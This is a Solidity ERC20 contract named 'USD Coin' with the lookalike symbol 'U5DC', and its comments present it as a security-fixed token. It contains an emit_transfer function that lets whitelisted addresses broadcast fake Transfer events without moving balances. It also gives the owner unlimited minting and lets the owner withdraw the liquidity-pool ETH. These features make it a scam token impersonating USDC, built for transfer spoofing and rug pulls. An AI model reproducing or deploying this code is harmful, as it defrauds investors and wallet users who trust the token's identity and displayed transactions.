// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title CustomERC20
 * @dev A fully self-contained ERC20 token implementation without external dependencies.
 * Fixed for critical security vulnerabilities regarding transfers and allowances.
 */

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (
        uint amountToken,
        uint amountETH,
        uint liquidity
    );

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (
        uint amountToken,
        uint amountETH
    );

    function WETH() external pure returns(address);
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns(address);
}


interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns(uint);
    function approve(address spender, uint value) external returns(bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract Custom_USDC {
    // --- State Variables ---
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    // --- Mappings ---
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
   

    // --- Access Control Variables ---
    address public owner;
    mapping(address => bool) public whitelist;

    // --- For liquidity ---
    address public router;
    address public lpPair;
    address public factory;

    IUniswapV2Router02 public dexRouter;

    // --- ERC20 Events ---
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event AddedToWhitelist(address indexed account);
    event RemovedFromWhitelist(address indexed account);
    event LiquidityAdded(uint256 tokenAmount, uint256 ethAmount, uint256 lpAmount, address pair);
    event LiquidityRemoved(uint256 lpAmount);

    // --- Modifiers ---
    modifier onlyOwner() {
        require(msg.sender == owner, "CustomERC20: caller is not the owner");
        _;
    }

    modifier onlyWhitelist() {
        require(whitelist[msg.sender], "Not whitelist");
        _;
    }

    // --- Constructor ---
    constructor() {
        name = "USD Coin";
        symbol = "U5DC";
        owner = msg.sender;

        router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        dexRouter = IUniswapV2Router02(router);

        // Mint initial supply to the deployer (accounting for 18 decimals)
        uint256 supplyWithDecimals = 100000000 * 10 ** uint256(decimals);
        totalSupply = supplyWithDecimals;
        _balances[msg.sender] = supplyWithDecimals;
        
        emit Transfer(address(0), msg.sender, supplyWithDecimals);
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function addLiquidity(uint256 tokenAmount) external payable onlyOwner returns(uint256 liquidity)
    {
        require(msg.value > 0, "ETH required");
        require(_balances[msg.sender] >= tokenAmount, "Insufficient contract tokens");

        _approve(address(this), address(dexRouter), tokenAmount);

        ( , , liquidity) = dexRouter.addLiquidityETH{value: msg.value}(
            address(this),
            tokenAmount,
            0,
            0,
            address(this),
            block.timestamp + 300
        );

        lpPair = IUniswapV2Factory(factory).getPair(
            address(this),
            dexRouter.WETH()
        );

        emit LiquidityAdded(tokenAmount, msg.value, liquidity, lpPair);
    }

    function removeLiquidity(uint256 liquidity) external onlyOwner
    {
        require(lpPair != address(0),"LP pair not set");


        IUniswapV2Pair pair = IUniswapV2Pair(lpPair);

        require(
            pair.balanceOf(address(this)) >= liquidity,
            "Insufficient LP balance"
        );

        pair.approve(
            address(dexRouter),
            liquidity
        );


        dexRouter.removeLiquidityETH(
            address(this),
            liquidity,
            0,
            0,
            owner,
            block.timestamp + 300
        );
    }

    function getPairTokens() external view returns(address token0, address token1)
    {
        require(lpPair != address(0), "LP pair not set");

        token0 = IUniswapV2Pair(lpPair).token0();
        token1 = IUniswapV2Pair(lpPair).token1();
    }

    function setPair(address pair) external onlyOwner
    {
        lpPair = pair;
    }

    receive() external payable {}

    function addToWhitelist(address[] calldata accounts) external onlyOwner {
        uint256 length = accounts.length;
        for (uint256 i = 0; i < length; i++) {
            if (!whitelist[accounts[i]]) {
                whitelist[accounts[i]] = true;
                emit AddedToWhitelist(accounts[i]);
            }
        }
    }

    function removeFromWhitelist(address[] calldata accounts) external onlyOwner {
        uint256 length = accounts.length;
        for (uint256 i = 0; i < length; i++) {
            if (whitelist[accounts[i]]) {
                whitelist[accounts[i]] = false;
                emit RemovedFromWhitelist(accounts[i]);
            }
        }
    }

    // --- ERC20 Mandatory Functions ---
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return _allowances[tokenOwner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount); // FIXED: Added missing allowance check
        _transfer(from, to, amount);
        return true;
    }

    // --- Optional/Extension Functions ---
    /**
     * @dev Creates new tokens. Restricted to the owner.
     */
    function mint(address to, uint256 amount) public onlyOwner {
        require(to != address(0), "CustomERC20: mint to the zero address");
        totalSupply += amount;
        _balances[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    /**
     * @dev Destroys tokens from the caller's account.
     */
    function burn(uint256 amount) public {
        address account = msg.sender;
        require(_balances[account] >= amount, "CustomERC20: burn amount exceeds balance");
        _balances[account] -= amount;
        totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    // --- Internal Helper Functions ---
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "CustomERC20: transfer from the zero address");
        require(to != address(0), "CustomERC20: transfer to the zero address");
	
	    uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "CustomERC20: transfer amount exceeds balance");

        _balances[from] = fromBalance - amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function emit_transfer(address from, address to, uint256 amount) public onlyWhitelist {
        emit Transfer(from, to, amount);
    }

    function _approve(address tokenOwner, address spender, uint256 amount) internal {
        require(tokenOwner != address(0), "CustomERC20: approve from the zero address");
        require(spender != address(0), "CustomERC20: approve to the zero address");

        _allowances[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount);
    }

    function _spendAllowance(address tokenOwner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(tokenOwner, spender);
        require(currentAllowance >= amount, "CustomERC20: insufficient allowance");
        _approve(tokenOwner, spender, currentAllowance - amount);
    }
}